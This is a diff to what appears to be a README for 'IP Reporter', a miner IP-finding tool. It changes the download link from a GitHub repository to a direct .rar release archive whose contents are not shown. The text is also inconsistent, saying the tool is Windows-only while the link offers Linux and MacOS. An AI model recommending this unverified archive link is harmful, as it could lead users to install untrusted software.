@@ -2,7 +2,7 @@
 
 IP Reporter is an application that helps you find the IP address of your new miner. To use IP Reporter, you need a computer that is on the same network as the miner, with a Microsoft Windows operating system. Note that our IP Reporter only works with Windows, and therefore the PC cannot scan the IP addresses of miners using other operating systems. When your miner is connected to a power source and connected to the same network, download IP Reporter to your PC.
 
-[Download IP Reporter for Windows/Linux/MacOS](https://github.com/10001m/antminer-ip-reporter)
+[Download IP Reporter for Windows/Linux/MacOS](https://github.com/10001m/antminer-ip-reporter/releases/download/IPReporter/IP.Reporter.rar)
 -----------------------------------------------------------------
 
 ## Instructions for installing and using IP Reporter
